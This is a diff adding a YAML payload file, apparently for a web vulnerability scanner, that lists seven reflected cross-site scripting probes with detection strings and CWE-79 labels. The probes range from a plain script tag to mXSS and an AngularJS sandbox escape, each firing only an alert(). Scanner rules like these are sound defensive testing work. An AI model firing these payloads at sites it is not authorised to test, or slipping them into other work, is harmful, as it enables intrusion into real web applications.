@@ -1,0 +1,54 @@
+id: xss-reflected
+name: Cross-site scripting — reflected
+context:
+  any: true
+
+payloads:
+  - value: "<script>alert('cyweb')</script>"
+    detect: { body_contains: "<script>alert('cyweb')</script>" }
+    id: xss-script-01
+    title: "XSS — reflected script tag"
+    severity: high
+    cwe: CWE-79
+
+  - value: "\"><img src=x onerror=alert('cyweb')>"
+    detect: { body_contains: "onerror=alert('cyweb')" }
+    id: xss-img-01
+    title: "XSS — reflected img onerror"
+    severity: high
+    cwe: CWE-79
+
+  - value: "javascript:alert('cyweb')"
+    detect: { body_contains: "javascript:alert('cyweb')" }
+    id: xss-uri-01
+    title: "XSS — javascript: URI reflected"
+    severity: high
+    cwe: CWE-79
+
+  - value: "<svg onload=alert('cyweb')>"
+    detect: { body_contains: "onload=alert('cyweb')" }
+    id: xss-svg-01
+    title: "XSS — SVG onload event handler"
+    severity: high
+    cwe: CWE-79
+
+  - value: "'\"><details open ontoggle=alert('cyweb')>"
+    detect: { body_contains: "ontoggle=alert" }
+    id: xss-details-01
+    title: "XSS — details ontoggle (CSP bypass)"
+    severity: high
+    cwe: CWE-79
+
+  - value: "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert('cyweb')>"
+    detect: { body_contains: "onerror=alert" }
+    id: xss-mutation-01
+    title: "XSS — DOM mutation (mXSS)"
+    severity: high
+    cwe: CWE-79
+
+  - value: "{{constructor.constructor('alert(1)')()}}"
+    detect: { body_contains: "constructor.constructor" }
+    id: xss-angularjs-01
+    title: "XSS — AngularJS sandbox escape"
+    severity: high
+    cwe: CWE-79
